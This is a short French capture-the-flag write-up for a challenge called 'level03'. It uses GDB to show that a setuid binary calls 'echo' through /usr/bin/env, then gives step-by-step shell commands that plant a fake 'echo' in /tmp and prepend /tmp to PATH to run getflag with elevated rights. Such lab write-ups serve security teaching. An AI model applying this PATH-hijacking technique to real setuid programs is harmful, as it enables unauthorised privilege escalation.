## Level 03

### Analyse
Le binaire level03 possède le bit setuid flag03. L'analyse avec GDB révèle qu'il exécute une commande système via env :

```bash
$ gdb level03 -ex "x/s 0x80485e0" -ex "quit"
0x80485e0: "/usr/bin/env echo Exploit me"
```
Comme le programme utilise /usr/bin/env echo sans chemin absolu, il cherche l'exécutable echo dans les dossiers listés par la variable d'environnement PATH.

### Exploitation
On crée un faux binaire echo pour détourner l'exécution vers getflag :

1. Créer le script : echo "getflag" > /tmp/echo
2. Donner les droits : chmod 755 /tmp/echo
3. Détourner le PATH : export PATH=/tmp:$PATH
4. Exécuter : ./level03
